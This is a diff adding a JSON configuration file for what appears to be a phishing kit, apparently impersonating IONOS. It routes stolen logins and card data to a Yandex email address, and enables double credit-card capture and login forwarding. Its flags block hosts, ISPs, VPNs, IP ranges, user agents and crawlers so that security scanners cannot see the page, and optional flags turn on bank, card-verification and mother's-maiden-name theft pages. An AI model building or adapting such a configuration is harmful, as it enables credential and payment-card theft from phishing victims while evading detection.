@@ -1,0 +1,23 @@
+{
+  "parameter"     : "apx",
+  "botredirect"   : "https://ionos.com",
+  "emailresult"   : "belajarspam124@yandex.com",
+  "loginresult"   : "belajarspam124@yandex.com",
+  "emailaccess"   : false,
+  "papid"         : false,
+  "doublecc"      : true,
+  "sendlogin"     : true,
+  "blockhost"     : true,
+  "blockisp"      : true,
+  "blockvpn"      : true,
+  "blockrange"    : true,
+  "blockbase"     : true,
+  "blockua"       : true,
+  "blockcrawler"  : true,
+  "lockdevice"    : "Allow All",
+  "vbv"           : false,
+  "bank"          : false,
+  "isdl"          : false,
+  "ismmn"         : false,
+  "onetime"       : false
+}
